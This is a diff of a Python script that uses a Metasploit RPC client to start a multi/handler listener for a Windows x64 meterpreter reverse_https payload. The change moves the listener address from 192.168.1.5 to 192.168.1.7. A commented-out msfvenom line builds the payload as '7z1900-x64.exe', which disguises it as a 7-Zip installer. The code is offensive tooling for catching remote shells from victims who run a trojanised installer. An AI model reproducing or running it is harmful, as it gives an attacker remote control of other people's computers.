@@ -4,14 +4,14 @@ import subprocess
 def init(client):
     #Create exe payload using msfvenom
     #print("[-] Creating exe payload using msfvenom")
-    #subprocess.call("msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.1.5 LPORT=443 -f exe > 7z1900-x64.exe",shell=True)
+    #subprocess.call("msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.1.7 LPORT=443 -f exe > 7z1900-x64.exe",shell=True)
     
     fail=''
     handler=''
     exploithandler = client.modules.use('exploit','multi/handler')
     exploithandler['ExitOnSession'] = False
     httpspl = client.modules.use('payload','windows/x64/meterpreter/reverse_https')
-    httpspl['LHOST'] = '192.168.1.5'
+    httpspl['LHOST'] = '192.168.1.7'
     httpspl['LPORT'] = '443'
     print("[*] Setting up handler...")
     cid = client.consoles.console().cid
